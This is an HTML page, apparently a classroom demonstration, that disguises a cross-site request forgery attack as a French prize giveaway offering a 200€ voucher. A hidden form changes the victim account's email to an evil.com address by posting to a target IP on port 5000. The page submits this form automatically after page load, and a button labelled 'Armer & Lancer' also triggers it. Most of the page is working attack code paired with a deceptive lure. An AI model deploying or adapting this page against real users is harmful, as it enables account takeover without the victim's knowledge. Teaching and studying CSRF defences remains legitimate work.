<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>🎁 Concours Exclusif - Cadeau Gratuit !</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding-top: 60px;
            margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            max-width: 650px;
            margin: auto;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }
        .config-box {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
            font-size: 13px;
        }
        .config-box input[type="text"] {
            width: 70%;
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #ddd;
            margin-top: 5px;
            color: black;
            font-weight: bold;
        }
        .btn-launch {
            background: #ff9800;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ffeb3b;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-size: 12px;
            color: #ffcdd2;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>🎁 Félicitations !</h1>
        <p>Veuillez patienter pendant la génération de votre bon d'achat de 200€...</p>
        
        <div class="loader"></div>
        <p><em>Attribution de votre lot en cours...</em></p>

        <!-- Panneau de contrôle pédagogique pour la démo multi-machines -->
        <div class="config-box">
            <strong>⚙️ Configuration de la Cible (IP de la Machine Victime) :</strong><br>
            <input type="text" id="targetIpInput" placeholder="Ex: 192.168.1.50">
            <button class="btn-launch" onclick="armAndTrigger()">Armer & Lancer</button>
            <div id="targetDisplay" style="margin-top: 6px; color: #aed581;"></div>
        </div>

        <p class="status">
            ⚠️ <strong>En coulisses :</strong> Un formulaire invisible va poster vers 
            <span id="targetUrlSpan" style="font-family: monospace;"></span> à votre insu !
        </p>
    </div>

    <!-- Formulaire Piège CSRF Dynamique -->
    <form id="csrfForm" method="POST" style="display: none;">
        <input type="hidden" name="email" value="hacker.malveillant@evil.com">
    </form>

    <script>
        // Récupérer l'IP de la victime via le paramètre d'URL ?target=192.168.x.x ou localStorage
        const params = new URLSearchParams(window.location.search);
        let targetIp = params.get('target') || localStorage.getItem('csrf_target_ip') || window.location.hostname;

        // Si l'attaquant tourne sur sa propre machine, on propose par défaut l'IP saisie
        document.getElementById('targetIpInput').value = targetIp;
        updateTargetDisplay(targetIp);

        function updateTargetDisplay(ip) {
            const url = `http://${ip}:5000/update-email`;
            document.getElementById('targetUrlSpan').innerText = url;
            document.getElementById('targetDisplay').innerText = `Cible active : http://${ip}:5000`;
            document.getElementById('csrfForm').action = url;
        }

        function armAndTrigger() {
            const ip = document.getElementById('targetIpInput').value.trim();
            if (ip) {
                localStorage.setItem('csrf_target_ip', ip);
                updateTargetDisplay(ip);
                console.log("[CSRF LAN] Déclenchement de l'attaque vers " + document.getElementById('csrfForm').action);
                document.getElementById('csrfForm').submit();
            } else {
                alert("Veuillez saisir l'adresse IP de la machine victime !");
            }
        }

        // Auto-déclenchement après 1,5 seconde si targetIp est définie
        window.onload = function() {
            if (targetIp && targetIp !== "localhost" && targetIp !== "127.0.0.1") {
                setTimeout(function() {
                    console.log("[CSRF LAN] Auto-soumission vers " + document.getElementById('csrfForm').action);
                    document.getElementById('csrfForm').submit();
                }, 1500);
            }
        };
    </script>
</body>
</html>
